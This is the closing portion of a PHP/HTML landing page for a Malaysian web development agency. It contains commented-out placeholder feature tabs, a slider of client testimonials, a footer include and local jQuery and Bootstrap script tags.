    <!--      </div>-->
    <!--      <div class="features-tab--item tab-pane fade" id="featuresTabItem02">-->
    <!--        <div class="row row-vc">-->
    <!--          <div class="features-tab--img col-md-6">-->
    <!--            <img src="img/features-tab-img/features-tab-item-02.png" alt="" class="img-responsive" />-->
    <!--          </div>-->
    <!--          <div class="features-tab--content col-md-6">-->
    <!--            <h3>Relax. Maximum security through redundant data storage.</h3>-->
    <!--            <p>Lorem ipsum dolor sit amet, consectetur adipisicing elit. Dolore reprehenderit laborum, ab exercitationem sunt aliquam illo! Aliquid labore animi, alias ratione ad necessitatibus ipsa perspiciatis. Quae architecto totam, reprehenderit ipsa.</p>-->
    <!--            <ul>-->
    <!--              <li>-->
    <!--                <i class="fa fa-check"></i>Lorem ipsum dolor sit amet-->
    <!--              </li>-->
    <!--              <li>-->
    <!--                <i class="fa fa-check"></i>Lorem ipsum dolor sit amet-->
    <!--              </li>-->
    <!--              <li>-->
    <!--                <i class="fa fa-check"></i>Lorem ipsum dolor sit amet-->
    <!--              </li>-->
    <!--              <li>-->
    <!--                <i class="fa fa-check"></i>Lorem ipsum dolor sit amet-->
    <!--              </li>-->
    <!--            </ul>-->
    <!--          </div>-->
    <!--        </div>-->
    <!--      </div>-->
    <!--      <div class="features-tab--item tab-pane fade" id="featuresTabItem03">-->
    <!--        <div class="row row-vc">-->
    <!--          <div class="features-tab--content col-md-6">-->
    <!--            <h3>You receive that unsolicited bulk messages. No More.</h3>-->
    <!--            <p>Lorem ipsum dolor sit amet, consectetur adipisicing elit. Dolore reprehenderit laborum, ab exercitationem sunt aliquam illo! Aliquid labore animi, alias ratione ad necessitatibus ipsa perspiciatis. Quae architecto totam, reprehenderit ipsa.</p>-->
    <!--            <ul>-->
    <!--              <li>-->
    <!--                <i class="fa fa-check"></i>Lorem ipsum dolor sit amet-->
    <!--              </li>-->
    <!--              <li>-->
    <!--                <i class="fa fa-check"></i>Lorem ipsum dolor sit amet-->
    <!--              </li>-->
    <!--              <li>-->
    <!--                <i class="fa fa-check"></i>Lorem ipsum dolor sit amet-->
    <!--              </li>-->
    <!--              <li>-->
    <!--                <i class="fa fa-check"></i>Lorem ipsum dolor sit amet-->
    <!--              </li>-->
    <!--            </ul>-->
    <!--          </div>-->
    <!--          <div class="features-tab--img col-md-6">-->
    <!--            <img src="img/features-tab-img/features-tab-item-03.png" alt="" class="img-responsive" />-->
    <!--          </div>-->
    <!--        </div>-->
    <!--      </div>-->
    <!--      <div class="features-tab--item tab-pane fade" id="featuresTabItem04">-->
    <!--        <div class="row row-vc">-->
    <!--          <div class="features-tab--img col-md-6">-->
    <!--            <img src="img/features-tab-img/features-tab-item-04.png" alt="" class="img-responsive" />-->
    <!--          </div>-->
    <!--          <div class="features-tab--content col-md-6">-->
    <!--            <h3>Extreme Support. If you need us, we are always here.</h3>-->
    <!--            <p>Lorem ipsum dolor sit amet, consectetur adipisicing elit. Dolore reprehenderit laborum, ab exercitationem sunt aliquam illo! Aliquid labore animi, alias ratione ad necessitatibus ipsa perspiciatis. Quae architecto totam, reprehenderit ipsa.</p>-->
    <!--            <ul>-->
    <!--              <li>-->
    <!--                <i class="fa fa-check"></i>Lorem ipsum dolor sit amet-->
    <!--              </li>-->
    <!--              <li>-->
    <!--                <i class="fa fa-check"></i>Lorem ipsum dolor sit amet-->
    <!--              </li>-->
    <!--              <li>-->
    <!--                <i class="fa fa-check"></i>Lorem ipsum dolor sit amet-->
    <!--              </li>-->
    <!--              <li>-->
    <!--                <i class="fa fa-check"></i>Lorem ipsum dolor sit amet-->
    <!--              </li>-->
    <!--            </ul>-->
    <!--          </div>-->
    <!--        </div>-->
    <!--      </div>-->
    <!--      <div class="features-tab--item tab-pane fade" id="featuresTabItem05">-->
    <!--        <div class="row row-vc">-->
    <!--          <div class="features-tab--content col-md-6">-->
    <!--            <h3>Promised SLA in any month</h3>-->
    <!--            <p>Lorem ipsum dolor sit amet, consectetur adipisicing elit. Dolore reprehenderit laborum, ab exercitationem sunt aliquam illo! Aliquid labore animi, alias ratione ad necessitatibus ipsa perspiciatis. Quae architecto totam, reprehenderit ipsa.</p>-->
    <!--            <ul>-->
    <!--              <li>-->
    <!--                <i class="fa fa-check"></i>Lorem ipsum dolor sit amet-->
    <!--              </li>-->
    <!--              <li>-->
    <!--                <i class="fa fa-check"></i>Lorem ipsum dolor sit amet-->
    <!--              </li>-->
    <!--              <li>-->
    <!--                <i class="fa fa-check"></i>Lorem ipsum dolor sit amet-->
    <!--              </li>-->
    <!--              <li>-->
    <!--                <i class="fa fa-check"></i>Lorem ipsum dolor sit amet-->
    <!--              </li>-->
    <!--            </ul>-->
    <!--          </div>-->
    <!--          <div class="features-tab--img col-md-6">-->
    <!--            <img src="img/features-tab-img/features-tab-item-05.png" alt="" class="img-responsive" />-->
    <!--          </div>-->
    <!--        </div>-->
    <!--      </div>-->
    <!--    </div>-->
    <!--  </div>-->
    <!--</div>-->
    <!-- Testimonial Area Start -->
       <div id="testimonial">
        <div class="container">
            <!-- Section Title Start -->
            <div class="section-title">
                <h2>Loved By <span data-counter-up="true">250</span> People</h2>
            </div>
            <!-- Section Title End -->
            
            <!-- Testimonial Slider Start -->
            <div class="testimonial-slider">
                <!-- Testimonial Item Start -->
                <div class="testimonial-item">
                    <div class="recommender-comment">
                        <p>This is by far the best Social Platform Web Apps i've ever tried. I can simply modify with its user-friendly customization to match with my business. The customer service is very helpful and replied in timely manner. Thanks, A|I Web Dev!</p>
                    </div>
                    
                    <div class="recommender-img">
                        <img src="img/pms/tradeshift.png" alt="" class="img-responsive"/>
                    </div>
                    
                    <div class="recommender-info">
                        <span class="recommender-name">Christian Lang</span>
                        <span class="recommender-role">CEO @ Tradeshift</span>
                    </div>
                </div>
                <!-- Testimonial Item End -->
                
                <!-- Testimonial Item Start -->
                <div class="testimonial-item">
                    <div class="recommender-comment">
                        <p>Absolute briliant look and feel, the functionality is exactly what you looking for and if is not there then just wait because the developer is incredible with constant updates! I'm truly so happy with the product and recommend supporting A|I Academy Management System and the developers behind it. Thank you!</p>
                    </div>
                    
                    <div class="recommender-img">
                        <img src="img/pms/sribestari.png" alt="" class="img-responsive"/>
                    </div>
                    
                    <div class="recommender-info">
                        <span class="recommender-name">Professor Dr. Kamila Ghazali,</span>
                        <span class="recommender-role">Associate VC @ Sri Bestari International School</span>
                    </div>
                </div>
                <!-- Testimonial Item End -->
                
                <!-- Testimonial Item Start -->
                <div class="testimonial-item">
                    <div class="recommender-comment">
                        <p>We have worked with A|I Web Development for our very first retail site and the amount of effort put in by the team has made the website our pride and it has ever since improved traffic. The services provided by the A|I Web Dev TO us top-notched, quick and efficient! Thank you, A|I Web Dev!</p>
                    </div>
                    
                    <div class="recommender-img">
                        <img src="img/pms/karyaneka.png" alt="" class="img-responsive"/>
                    </div>
                    
                    <div class="recommender-info">
                        <span class="recommender-name">Puan Norizmah binti Mustafa,</span>
                        <span class="recommender-role">GM @ Karyaneka</span>
                    </div>
                </div>
                <!-- Testimonial Item End -->

                <!-- Testimonial Item Start -->
                <div class="testimonial-item">
                    <div class="recommender-comment">
                        <p>Thanks to Abie! truly it has been a pleasure working with you on this implementation. We are truly satisfy by the professionalism you have demonstrated all this time and the quality of work of the website, plus the effort of your entire team. Kudos guys!</p>
                    </div>
                    
                    <div class="recommender-img">
                        <img src="img/pms/utm.png" alt="" class="img-responsive"/>
                    </div>
                    
                    <div class="recommender-info">
                        <span class="recommender-name">Dato' Abu Bakar bin Mohd,</span>
                        <span class="recommender-role">BOD @ UTM</span>
                    </div>
                </div>
                <!-- Testimonial Item End -->

                 <!-- Testimonial Item Start -->
                 <div class="testimonial-item">
                    <div class="recommender-comment">
                        <p>A|I Web Dev is incredibly patient and very understanding to my creative needs, which is essential to producing the desired outcome, which I am very happy with. Of course there were technical glitches and stumbling blocks but A|I Web Dev's team was always on top of it and have been very quick to resolve all issues. They are responsible and always there for me and very obliging, which is what a good agency should be.</p>
                    </div>
                    
                    <div class="recommender-img">
                        <img src="img/pms/uniten.png" alt="" class="img-responsive"/>
                    </div>
                    
                    <div class="recommender-info">
                        <span class="recommender-name">YBhg. Dato' Prof. Ir. Dr. Ibrahim Bin Hussein,</span>
                        <span class="recommender-role">BOD @ UNITEN</span>
                    </div>
                </div>
                <!-- Testimonial Item End -->

            </div>
            <!-- Testimonial Slider End -->
        </div>
    </div>
    <!-- Testimonial Area End -->
    <!--<div id="contactInfo">-->
    <!--  <div class="container">-->
    <!--    <div class="row reset-gutter">-->
    <!--      <div class="contact-info--item col-md-3 col-xs-6">-->
    <!--        <a href="#">-->
    <!--          <i class="fa fa-headphones"></i>24/7 Customer Support </a>-->
    <!--      </div>-->
    <!--      <div class="contact-info--item col-md-3 col-xs-6">-->
    <!--        <a href="#">-->
    <!--          <i class="fa fa-envelope-o"></i>support@example.com </a>-->
    <!--      </div>-->
    <!--      <div class="contact-info--item col-md-3 col-xs-6">-->
    <!--        <a href="#">-->
    <!--          <i class="fa fa-comments-o"></i>Click Here To Live Chat </a>-->
    <!--      </div>-->
    <!--      <div class="contact-info--item col-md-3 col-xs-6">-->
    <!--        <a href="#">-->
    <!--          <i class="fa fa-phone"></i>+44 000 000 000 </a>-->
    <!--      </div>-->
    <!--    </div>-->
    <!--  </div>-->
    <!--</div>-->
     <!-- Footer Area Start -->
    <?php

		require_once('footer.php');

		?>
    <!-- Footer Area End -->
    <!--<div id="backToTop">-->
    <!--  <a href="body" data-animate-scroll="true">-->
    <!--    <i class="fa fa-angle-up"></i>-->
    <!--  </a>-->
    <!--</div>-->
    <script src="js/jquery-3.1.0.min.js"></script>
    <script src="js/jquery-ui.min.js"></script>
    <script src="js/jquery.ui.touch-punch.min.js"></script>
    <script src="js/bootstrap.min.js"></script>
    <script src="js/fakeLoader.min.js"></script>
    <script src="js/jquery.sticky.js"></script>
    <script src="js/owl.carousel.min.js"></script>
    <script src="js/jquery.tubular.1.0.js"></script>
    <script src="js/jquery.magnific-popup.min.js"></script>
    <script src="js/jquery.validate.min.js"></script>
    <script src="js/animatescroll.min.js"></script>
    <script src="js/jquery.waypoints.min.js"></script>
    <script src="js/jquery.counterup.min.js"></script>
    <script src="js/jquery.countdown.min.js"></script>
    <script src="js/custom-color-switcher.js"></script>
    <script src="js/retina.min.js"></script>
    <script src="js/main.js"></script>
  </body>
</html>
